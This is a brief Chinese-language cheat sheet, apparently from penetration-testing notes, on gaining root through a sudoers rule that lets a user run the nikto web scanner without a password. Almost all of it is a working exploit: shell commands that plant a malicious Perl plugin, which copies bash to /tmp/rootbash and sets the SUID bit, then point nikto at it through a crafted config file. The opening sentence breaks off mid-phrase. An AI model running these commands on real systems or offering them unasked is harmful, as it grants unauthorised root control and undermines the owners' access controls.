nikto是perl语言编写的 web漏洞扫描工具，其中的config选项，可以在

```
NOPASSWD: /usr/bin/nikto
```
可以以root权限执行nikto情况下利用提权到root

```
mkdir -p /tmp/evil_plugins

cat > /tmp/evil_plugins/nikto_core.plugin << 'EOF'

#!/usr/bin/perl
system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
1;
EOF

cat > /tmp/evil.conf << 'EOF'

EXECDIR=/tmp

PLUGINDIR=/tmp/evil_plugins

EOF

sudo nikto -config /tmp/evil.conf -host 127.0.0.1
```
